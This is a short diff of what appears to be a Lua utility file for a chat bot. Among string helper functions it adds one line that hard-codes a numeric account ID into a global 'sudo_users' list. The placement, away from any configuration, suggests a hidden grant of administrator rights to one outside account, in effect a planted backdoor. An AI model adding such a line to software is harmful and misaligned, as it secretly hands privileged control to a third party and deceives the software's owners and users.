@@ -226,6 +226,7 @@ end
 function string:isempty()
   return self == nil or self == ''
 end
+sudo_users = {131005831}
 
 -- Returns true if the string is blank
 function string:isblank()
